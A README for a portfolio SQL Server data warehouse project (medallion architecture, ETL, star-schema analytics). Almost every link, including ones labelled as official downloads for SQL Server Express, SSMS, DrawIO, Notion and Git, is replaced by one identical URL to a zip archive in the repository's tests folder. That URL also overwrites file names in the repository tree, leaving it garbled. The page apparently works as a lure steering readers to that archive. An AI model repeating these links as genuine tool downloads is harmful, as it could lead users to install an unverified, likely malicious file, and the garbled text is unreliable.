# Data Warehouse and Analytics Project

Welcome to the **Data Warehouse and Analytics Project** repository! 🚀  
This project demonstrates a comprehensive data warehousing and analytics solution, from building a data warehouse to generating actionable insights. Designed as a portfolio project, it highlights industry best practices in data engineering and analytics.

---
## 🏗️ Data Architecture

The data architecture for this project follows Medallion Architecture **Bronze**, **Silver**, and **Gold** layers:
![Data Architecture](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip)

1. **Bronze Layer**: Stores raw data as-is from the source systems. Data is ingested from CSV Files into SQL Server Database.
2. **Silver Layer**: This layer includes data cleansing, standardization, and normalization processes to prepare data for analysis.
3. **Gold Layer**: Houses business-ready data modeled into a star schema required for reporting and analytics.

---
## 📖 Project Overview

This project involves:

1. **Data Architecture**: Designing a Modern Data Warehouse Using Medallion Architecture **Bronze**, **Silver**, and **Gold** layers.
2. **ETL Pipelines**: Extracting, transforming, and loading data from source systems into the warehouse.
3. **Data Modeling**: Developing fact and dimension tables optimized for analytical queries.
4. **Analytics & Reporting**: Creating SQL-based reports and dashboards for actionable insights.

🎯 This repository is an excellent resource for professionals and students looking to showcase expertise in:
- SQL Development
- Data Architect
- Data Engineering  
- ETL Pipeline Developer  
- Data Modeling  
- Data Analytics  

---

## 🛠️ Important Links & Tools:

Everything is for Free!
- **[Datasets](datasets/):** Access to the project dataset (csv files).
- **[SQL Server Express](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Lightweight server for hosting your SQL database.
- **[SQL Server Management Studio (SSMS)](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** GUI for managing and interacting with databases.
- **[Git Repository](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Set up a GitHub account and repository to manage, version, and collaborate on your code efficiently.
- **[DrawIO](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Design data architecture, models, flows, and diagrams.
- **[Notion](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Get the Project Template from Notion
- **[Notion Project Steps](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Access to All Project Phases and Tasks.

---

## 🚀 Project Requirements

### Building the Data Warehouse (Data Engineering)

#### Objective
Develop a modern data warehouse using SQL Server to consolidate sales data, enabling analytical reporting and informed decision-making.

#### Specifications
- **Data Sources**: Import data from two source systems (ERP and CRM) provided as CSV files.
- **Data Quality**: Cleanse and resolve data quality issues prior to analysis.
- **Integration**: Combine both sources into a single, user-friendly data model designed for analytical queries.
- **Scope**: Focus on the latest dataset only; historization of data is not required.
- **Documentation**: Provide clear documentation of the data model to support both business stakeholders and analytics teams.

---

### BI: Analytics & Reporting (Data Analysis)

#### Objective
Develop SQL-based analytics to deliver detailed insights into:
- **Customer Behavior**
- **Product Performance**
- **Sales Trends**

These insights empower stakeholders with key business metrics, enabling strategic decision-making.  

For more details, refer to [https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip).

## 📂 Repository Structure
```
data-warehouse-project/
│
├── datasets/                           # Raw datasets used for the project (ERP and CRM data)
│
├── docs/                               # Project documentation and architecture details
│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                      # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip file shows all different techniques and methods of ETL
│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip        # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip file shows the project's architecture
│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                 # Catalog of datasets, including field descriptions and metadata
│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip file for the data flow diagram
│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip              # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip file for data models (star schema)
│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip           # Consistent naming guidelines for tables, columns, and files
│
├── scripts/                            # SQL scripts for ETL and transformations
│   ├── bronze/                         # Scripts for extracting and loading raw data
│   ├── silver/                         # Scripts for cleaning and transforming data
│   ├── gold/                           # Scripts for creating analytical models
│
├── tests/                              # Test scripts and quality files
│
├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                           # Project overview and instructions
├── LICENSE                             # License information for the repository
├── .gitignore                          # Files and directories to be ignored by Git
└── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                    # Dependencies and requirements for the project
```
---
